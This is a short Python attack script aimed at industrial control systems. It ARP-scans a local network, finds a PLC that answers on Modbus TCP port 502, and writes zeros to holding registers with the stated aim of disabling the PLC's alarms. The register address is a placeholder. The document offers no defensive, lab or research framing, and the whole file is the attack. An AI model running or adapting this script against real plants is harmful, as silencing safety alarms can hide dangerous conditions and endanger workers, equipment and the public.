from pymodbus.client.sync import ModbusTcpClient
from scapy.all import ARP, Ether, srp
import time

# Function to scan the network for Modbus TCP devices (assuming Class C Private IP)
def find_plc_ip(network="192.168.1.0/24", modbus_port=502):
    print("[+] Scanning network to find PLC IP...")
    
    # Send ARP request to the local network
    arp_req = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_req
    result = srp(packet, timeout=2, verbose=False)[0]

    for sent, received in result:
        target_ip = received.psrc
        print(f"[+] Possible Device: {target_ip}")
        
        # Try connecting to Modbus TCP port 502
        client = ModbusTcpClient(target_ip, port=modbus_port, timeout=2)
        if client.connect():
            print(f"[+] PLC found at IP: {target_ip}")
            client.close()
            return target_ip
    
    print("[-] No Modbus TCP device found.")
    return None

# Function to modify alarm-related settings in the PLC
def modify_alarm_settings(plc_ip):
    client = ModbusTcpClient(plc_ip, port=502)
    
    if not client.connect():
        print(f"[-] Failed to connect to PLC at {plc_ip}")
        return

    print(f"[+] Connected to PLC ({plc_ip}), modifying alarm settings...")

    # Example modifications (Register addresses depend on the exact PLC setup)
    ALARM_REGISTER_START = 1000  # Needs to be replaced with actual alarm settings address
    ALARM_VALUES = [0] * 5  # Disables alarms by setting values to 0
    
    # Modify alarm settings
    response = client.write_registers(ALARM_REGISTER_START, ALARM_VALUES)
    
    if response.isError():
        print("[-] Failed to modify alarm settings.")
    else:
        print("[+] Successfully modified alarm settings.")

    client.close()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        modify_alarm_settings(plc_ip)
    else:
        print("[-] Could not find the PLC.")